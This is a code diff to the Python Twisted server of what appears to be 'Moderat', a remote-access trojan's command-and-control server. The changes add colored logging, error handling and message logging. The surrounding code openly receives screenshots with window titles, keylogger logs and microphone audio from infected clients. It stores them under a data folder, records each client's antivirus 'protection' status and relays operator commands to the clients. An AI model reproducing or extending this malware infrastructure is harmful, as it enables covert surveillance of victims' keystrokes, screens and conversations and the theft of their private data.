@@ -6,6 +6,7 @@ import random
 import ast
 import os
 import datetime
+import coloredlogs
 
 from twisted.internet.protocol import Protocol, ServerFactory
 from twisted.internet import reactor
@@ -26,8 +27,9 @@ DATA_STORAGE = r'C:\DATA'
 
 # Initialize logger
 log = logging.getLogger('')
+# Initialize coloredlogs
 log.setLevel(logging.DEBUG)
-format = logging.Formatter("%(asctime)s - %(name)s - %(levelname)s - %(message)s")
+format = coloredlogs.ColoredFormatter("%(message)-40s (%(filename)s:%(lineno)d)")
 
 ch = logging.StreamHandler(sys.stdout)
 ch.setFormatter(format)
@@ -95,22 +97,27 @@ class ModeratServerProtocol(Protocol):
             pass
 
     def dataReceived(self, data, end='[ENDOFMESSAGE]'):
-        # Data Received
-        self.__buffer__ += data
-        if self.__buffer__.endswith(end):
+        try:
+            # Data Received
+            self.__buffer__ += data
+            if self.__buffer__.endswith(end):
 
-            all_data = self.__buffer__[:-len(end)]
-            if end in all_data:
-                all_data = all_data.split(end)[-1]
-            self.__buffer__ = ''
-            command = ast.literal_eval(all_data)
+                all_data = self.__buffer__[:-len(end)]
+                if end in all_data:
+                    all_data = all_data.split(end)[-1]
+                self.__buffer__ = ''
+                command = ast.literal_eval(all_data)
 
-            # Switch to client commands
-            if command['from'] == 'client':
-                self.client_commands(command['payload'], command['mode'], command['session_id'], command['key'])
-            # Switch to moderator commands
-            elif command['from'] == 'moderator':
-                self.moderator_commands(command)
+                # Switch to client commands
+                if command['from'] == 'client':
+                    log.warning('[*RECV] [Client: %s] [Mode: (%s)]' % (self.transport.getPeer().host, command['mode']))
+                    self.client_commands(command['payload'], command['mode'], command['session_id'], command['key'])
+                # Switch to moderator commands
+                elif command['from'] == 'moderator':
+                    log.warning('[*RECV] [Moderator: %s] [Mode: (%s)]' % (self.transport.getPeer().host, command['mode']))
+                    self.moderator_commands(command)
+        except Exception as errMessage:
+            log.error('[*RECV] Malformed Message. [FROM: %s] errMessage(%s)' % (self.transport.getPeer().host, errMessage))
 
     def client_commands(self, payload, mode, session_id, key):
 
@@ -126,12 +133,12 @@ class ModeratServerProtocol(Protocol):
         # Clients Initializing
         elif mode == 'clientInitializing':
 
-            log.info('Get Key If Exists Or Generate New One')
+            log.debug('[*CLIENT] Initializing Client Key')
 
             # If client has no key generate new one and send
             if payload == 'noKey':
                 client_id = id_generator()
-                log.info('Generate New Key (%s)' % client_id)
+                log.debug('[*CLIENT] Generate New Key (%s)' % client_id)
                 self.send_message_to_client(self, client_id, 'clientInitializing')
 
             # else get key from client
@@ -143,7 +150,7 @@ class ModeratServerProtocol(Protocol):
                 'status': False,
             }
 
-            log.info('[*] New Client from %s' % self.transport.getHost())
+            log.debug('[*CLIENT] New Client from %s' % self.transport.getHost())
 
             # Create Client DB Entry
             manageClients.create_client('admin', client_id, self.transport.getHost().host)
@@ -171,26 +178,22 @@ class ModeratServerProtocol(Protocol):
             screen_info = ast.literal_eval(payload)
             screen_path, name, window_title, date = save_image(screen_info, key, DATA_STORAGE)
             manageScreenshots.save_image(key, name, screen_path, window_title, date)
-            log.info('Screenshot Saved (%s)' % key)
 
         elif mode == 'keyloggerLogs':
             keylogger_info = ast.literal_eval(payload)
             html_path, datetime_stamp = html_generator(key, keylogger_info, DATA_STORAGE)
             manageKeylogs.save_keylog(key, datetime_stamp, html_path)
-            log.info('Keylogs Saved (%s)' % key)
 
         elif mode == 'audioLogs':
             audio_info = ast.literal_eval(payload)
             wav_path, datetime_stamp = wav_generator(key, audio_info, DATA_STORAGE)
             manageAudio.save_audio(key, datetime_stamp, wav_path)
-            log.info('Audio Saved (%s)' % key)
 
         elif moderators.has_key(session_id):
-            log.info('Send Data to Moderator (%s)' % moderators[session_id]['username'])
             self.send_message_to_moderator(moderators[session_id]['socket'], payload, mode)
 
         else:
-            return
+            log.error('[*ERROR] Invalid Mode (%s)' % mode)
 
     def moderator_commands(self, data):
 
@@ -241,7 +244,7 @@ class ModeratServerProtocol(Protocol):
                     shared_clients[_id] = {
                         'moderator':            manageClients.get_moderator(_id),
                         'alias':                manageClients.get_alias(_id),
-                        'ip_address':           self.transport.getHost().host,
+                        'ip_address':           clients[_id]['ip_address'],
                         'os_type':              clients[_id]['os_type'],
                         'os':                   clients[_id]['os'],
                         'protection':           clients[_id]['protection'],
@@ -429,8 +432,7 @@ class ModeratServerProtocol(Protocol):
         return True if manageModerators.get_privs(moderators[session_id]['username']) == 1 else False
 
     # Send Message To Client
-    @staticmethod
-    def send_message_to_client(client, message, mode, _from='server', session_id='', end='[ENDOFMESSAGE]'):
+    def send_message_to_client(self, client, message, mode, _from='server', session_id='', end='[ENDOFMESSAGE]'):
         # Send Data Function
         client.transport.write(str({
             'payload': message,
@@ -438,21 +440,22 @@ class ModeratServerProtocol(Protocol):
             'from': _from,
             'session_id': session_id,
         })+end)
+        log.warning('[*SENT] [TO: %s] [FROM: %s] [MODE: %s]' % (client.transport.getPeer().host, self.transport.getPeer().host, mode))
 
     # Send Message To Moderator
-    @staticmethod
-    def send_message_to_moderator(moderator, message, mode, _from='server', end='[ENDOFMESSAGE]'):
+    def send_message_to_moderator(self, moderator, message, mode, _from='server', end='[ENDOFMESSAGE]'):
         moderator.transport.write(str({
             'payload': message,
             'mode': mode,
             'from': _from,
             'to': '',
         })+end)
+        log.warning('[*SENT] [TO: %s] [FROM: %s] [MODE: %s]' % (moderator.transport.getPeer().host, self.transport.getPeer().host, mode))
 
 
 class ModeratServerFactory(ServerFactory):
 
-    log.info('Moderat Server Started')
+    log.debug('[*SERVER] Moderat Server Started')
 
     protocol = ModeratServerProtocol
 
@@ -461,7 +464,7 @@ class ModeratServerFactory(ServerFactory):
 
 
 reactor.listenTCP(CLIENTS_PORT, ModeratServerFactory())
-log.info('Set Clients Port to %s' % str(CLIENTS_PORT))
+log.debug('[*SERVER] Set Clients Port to %s' % str(CLIENTS_PORT))
 reactor.listenTCP(MODERATORS_PORT, ModeratServerFactory())
-log.info('Set Moderators Port to %s' % str(MODERATORS_PORT))
+log.debug('[*SERVER] Set Moderators Port to %s' % str(MODERATORS_PORT))
 reactor.run()
